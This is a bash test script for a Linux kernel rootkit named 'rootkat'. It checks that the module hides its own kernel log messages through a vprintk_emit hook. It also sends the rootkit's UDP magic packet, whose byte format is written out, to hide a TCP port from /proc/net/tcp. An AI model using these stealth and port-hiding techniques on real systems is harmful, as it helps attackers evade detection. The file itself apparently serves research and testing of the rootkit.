#!/usr/bin/env bash
# Asserts: with rootkat loaded, dmesg shows essentially no "rootkat"
# lines beyond the kernel's pre-init OOT-taint warning. The runtime
# silence is achieved two ways:
#   1. rootkat's own log calls are pr_debug, suppressed by
#      dynamic_debug unless explicitly enabled (so they're absent
#      from the ring buffer to begin with).
#   2. The vprintk_emit hook drops kernel-originated printks whose
#      formatted text contains the "rootkat" marker — primarily the
#      "<mod>: loading out-of-tree module taints kernel" warning IF
#      it ever prints after rootkat_init runs (it doesn't, on Linux,
#      but the hook is the safety net for anything else).
#
# The OOT-taint warning prints from module-load machinery BEFORE
# rootkat_init runs, so it cannot be filtered from inside rootkat
# itself — that's structural. Documented in docs/threat-model.md.
set -u
cd /root/rootkat
. tests/qemu/lib.sh

CONTROL_MSG="kat-test-marker-not-from-the-module-$$"

dmesg -c >/dev/null 2>&1 || true
assert_zero "module loads" insmod lkm/rootkat.ko
sleep 0.2

# Bound: at most 2 rootkat lines in dmesg post-load — the OOT-taint
# warning and one further leakage at most. A regression that breaks
# the silence (e.g. accidentally turning pr_debug back into pr_info)
# blows past this immediately.
N=$(dmesg | grep -c rootkat || true)
echo "post-load rootkat lines in dmesg: $N"
if [ "$N" -le 2 ]; then
	echo "PASS: bootstrap leakage within bounds"
	ROOTKAT_PASS=$((ROOTKAT_PASS+1))
else
	echo "FAIL: $N rootkat lines visible (>2 indicates regression)"
	dmesg | grep rootkat | head -20
	ROOTKAT_FAIL=$((ROOTKAT_FAIL+1))
fi

# Filter check: write a "rootkat" message via /dev/kmsg → should be
# dropped by the vprintk_emit hook (devkmsg_write goes through the
# same vprintk_emit chokepoint).
echo "userspace-rootkat-attempt-$$" > /dev/kmsg
sleep 0.1
assert_nonzero "userspace 'rootkat' message dropped via /dev/kmsg" \
	bash -c "dmesg | grep -q 'userspace-rootkat-attempt-$$'"

# Selectivity check: a non-rootkat message passes through untouched.
echo "$CONTROL_MSG" > /dev/kmsg
sleep 0.1
assert_zero "non-rootkat marker passes through" \
	bash -c "dmesg | grep -q '$CONTROL_MSG'"

# Side-effect sanity: trigger a netfilter magic packet so we know
# rootkat is functioning, not just inert.
HIDE_PORT=12361
exec 3< <(tests/qemu/net_helper $HIDE_PORT)
read -r LINE <&3
NET_PID=$!
sleep 0.2
python3 -c "
import socket, struct
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = b'rootkat\x00' + bytes([2]) + b'\x00\x00\x00' + struct.pack('!I', $HIDE_PORT)
s.sendto(payload, ('127.0.0.1', 65000))
s.close()
"
sleep 0.2
assert_nonzero "rootkat is alive (netfilter handler hid the port)" \
	bash -c "awk 'NR>1{split(\$2,a,\":\"); printf \"%d\\n\", strtonum(\"0x\" a[2])}' /proc/net/tcp | grep -qx $HIDE_PORT"
kill $NET_PID 2>/dev/null || true
wait $NET_PID 2>/dev/null || true
exec 3<&-

assert_zero "module unloads" rmmod rootkat
sleep 0.2

# After unload the filter is gone; rootkat-marker messages flow again.
POSTMSG="post-unload-rootkat-marker-$$"
echo "$POSTMSG" > /dev/kmsg
sleep 0.1
assert_zero "post-unload: rootkat marker visible again" \
	bash -c "dmesg | grep -q '$POSTMSG'"

report
